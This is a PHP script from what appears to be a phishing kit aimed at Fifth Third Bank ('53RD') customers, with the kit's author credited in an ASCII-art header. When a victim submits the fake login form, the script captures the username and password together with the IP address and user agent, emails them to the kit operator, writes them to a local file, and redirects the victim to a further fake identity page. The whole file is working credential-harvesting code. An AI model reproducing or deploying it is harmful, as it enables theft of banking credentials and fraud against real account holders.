<?php 

/*       
// made by ANOXYTY" // https://icq.im/Anoxyty "HQ PAGE"
                           ______
        |\_______________ (_____\\______________
HH======#H###############H#######################
        ' ~""""""""""""""`##(_))#H\"""""Y########
                          ))    \#H\       `"Y###
                          "      }#H)
*/

	ob_start();
session_start();
	include '../data.php';
$ip = getenv("REMOTE_ADDR");
$hostname = gethostbyaddr($ip);
$useragent = $_SERVER['HTTP_USER_AGENT'];
	if ( isset( $_POST['username'] ) ) {
		
		$_SESSION['username'] 	  = $_POST['username'];
		$_SESSION['password'] 	  = $_POST['password'];
		$code = <<<EOT
============== [ 53RD Login By Anoxyty | ]🔥 ==============
[USERNAME] 		: {$_SESSION['username']}
[PASSWORD]		: {$_SESSION['password']}

	--------🔑 I N F O | I P 🔑 --------
IP		: $ip
IP lookup		: https://ip-api.com/$ip
OS		: $useragent

============= [ ./💼 53RD Login By Anoxyty💼 ] =============
\r\n\r\n
EOT;

		$subject = "🏛️ 53RD User Info By Anoxyty🏛️  From $ip";
        $headers = "From: 🍁Anoxyty🍁 <53rdeby@anoxyty.com>\r\n";
        $headers .= "MIME-Version: 1.0\r\n";
        $headers .= "Content-Type: text/plain; charset=UTF-8\r\n";
        @mail($data,$subject,$code,$headers);

		$save = fopen("../stored.txt","a+");
        fwrite($save,$code);
        fclose($save);

        header("Location: ../email_identity?oamo/identity/_YOUR_INFORMATION_PAGE&token=cjmvJprW2Dw1/recognizeUser/mfaidentification");
        exit();
	} else {
		header("Location: ../index?");
		exit();
	}
?>